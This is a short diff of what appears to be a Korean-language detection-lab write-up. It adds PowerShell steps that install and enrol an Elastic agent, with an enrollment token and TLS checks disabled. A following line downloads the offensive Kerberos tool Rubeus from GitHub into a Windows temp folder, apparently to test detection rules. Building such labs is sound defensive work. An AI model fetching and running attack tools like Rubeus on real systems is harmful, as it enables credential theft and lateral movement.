@@ -145,7 +145,13 @@ cd elastic-agent-9.0.8-windows-x86_64
 
 현재는 기본 탐지 룰 세팅이 활성화 되어 있는 상태이다.
 
-
+```
+$ProgressPreference = 'SilentlyContinue'
+Invoke-WebRequest -Uri https://artifacts.elastic.co/downloads/beats/elastic-agent/elastic-agent-9.0.8-windows-x86_64.zip -OutFile elastic-agent-9.0.8-windows-x86_64.zip 
+Expand-Archive .\elastic-agent-9.0.8-windows-x86_64.zip -DestinationPath .
+cd elastic-agent-9.0.8-windows-x86_64
+.\elastic-agent.exe install --url=https://192.168.200.136:8220 --enrollment-token=ZThLcUJKc0JYVDVSODRyQ0NHTGw6Wl9reVdwbEVJUEp0ZE1BZTVuVjk3UQ== --insecure
+```
 
 ```powershell
 iex(new-object net.webclient).downloadfile('https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.5_Any/Rubeus.exe','C:\windows\temp\rubeus.exe')
